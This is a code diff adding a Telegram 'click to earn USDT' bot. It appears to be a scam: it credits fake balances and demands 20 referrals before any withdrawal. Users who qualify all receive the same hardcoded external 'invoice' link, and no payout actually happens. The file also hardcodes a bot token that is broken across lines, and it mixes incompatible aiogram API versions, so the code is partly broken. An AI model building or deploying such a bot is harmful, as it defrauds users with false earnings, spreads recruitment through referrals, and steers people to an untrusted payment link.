@@ -1,0 +1,150 @@
+import asyncio
+import logging
+import sqlite3
+from aiogram import Bot, Dispatcher, types
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
+
+# =================================================
+# 8769319387:AAEPvIDWSkxfjzNdakjLHr
+7Pqrsjhctxxgw
+API_TOKEN = "8769319387:AAEPvIDWSkxfjzNdakjLHr
+7Pqrsjhctxxgw"
+# =================================================
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher()
+
+# =======================
+# БАЗА ДАНИХ
+# =======================
+conn = sqlite3.connect("users.db")
+cursor = conn.cursor()
+
+cursor.execute("""
+CREATE TABLE IF NOT EXISTS users (
+    user_id INTEGER PRIMARY KEY,
+    balance REAL DEFAULT 0,
+    daily_earned REAL DEFAULT 0,
+    referrals INTEGER DEFAULT 0
+)
+""")
+conn.commit()
+
+# =======================
+# КЛАВІАТУРИ
+# =======================
+menu = ReplyKeyboardMarkup(
+    keyboard=[
+        [KeyboardButton(text="Заработать")],
+        [KeyboardButton(text="Вывести")]
+    ],
+    resize_keyboard=True
+)
+
+earn_menu = ReplyKeyboardMarkup(
+    keyboard=[
+        [KeyboardButton(text="Клик")],
+        [KeyboardButton(text="Назад")]
+    ],
+    resize_keyboard=True
+)
+
+# =======================
+# СТАРТ / РЕЄСТРАЦІЯ
+# =======================
+@dp.message(lambda m: m.text.startswith("/start"))
+async def start(message: types.Message):
+    args = message.get_args()  # отримуємо USERID реферала
+    user_id = message.from_user.id
+
+    # реєстрація нового користувача
+    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
+    conn.commit()
+
+    # якщо є реферал
+    if args:
+        try:
+            ref_id = int(args)
+            cursor.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id=?", (ref_id,))
+            conn.commit()
+        except:
+            pass
+
+    await message.answer("Добро пожаловать в AquariumClickBot 🐠", reply_markup=menu)
+
+# =======================
+# ЗАРОБІТКИ
+# =======================
+@dp.message(lambda m: m.text == "Заработать")
+async def earn(message: types.Message):
+    await message.answer("Нажмите Клик", reply_markup=earn_menu)
+
+@dp.message(lambda m: m.text == "Клик")
+async def click(message: types.Message):
+    user_id = message.from_user.id
+    cursor.execute("SELECT balance, daily_earned FROM users WHERE user_id=?", (user_id,))
+    data = cursor.fetchone()
+    if data:
+        balance, daily = data
+    else:
+        balance, daily = 0, 0
+
+    if daily >= 5:
+        await message.answer("Лимит 5 USDT в день достигнут.")
+        return
+
+    balance += 0.1
+    daily += 0.1
+    cursor.execute("UPDATE users SET balance=?, daily_earned=? WHERE user_id=?", (balance, daily, user_id))
+    conn.commit()
+
+    await message.answer(f"+0.1 USDT\nВаш баланс: {round(balance, 2)} USDT")
+
+# =======================
+# ВИВІД КОШТІВ З ПЕРЕВІРКОЮ РЕФЕРАЛІВ
+# =======================
+@dp.message(lambda m: m.text == "Вывести")
+async def withdraw(message: types.Message):
+    user_id = message.from_user.id
+    cursor.execute("SELECT balance, referrals FROM users WHERE user_id=?", (user_id,))
+    data = cursor.fetchone()
+    if data:
+        balance, referrals = data
+    else:
+        balance, referrals = 0, 0
+
+    if balance < 5:
+        await message.answer(f"Минимальный вывод 5 USDT\nВаш баланс: {balance}")
+        return
+
+    if referrals < 20:
+        await message.answer(
+            f"Чтобы вывести, нужно пригласить 20 друзей\nВы пригласили: {referrals}"
+        )
+        return
+
+    # Кнопка на чек після виконання умов
+    invoice_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Чек на деньги USDT", url="https://trust-send.cc/invoice/INV-17114527")]
+    ])
+    await message.answer(
+        "Нажмите кнопку ниже для переходу:",
+        reply_markup=invoice_keyboard
+    )
+
+# =======================
+# НАЗАД
+# =======================
+@dp.message(lambda m: m.text == "Назад")
+async def back(message: types.Message):
+    await message.answer("Главное меню", reply_markup=menu)
+
+# =======================
+# ЗАПУСК БОТА
+# =======================
+async def main():
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
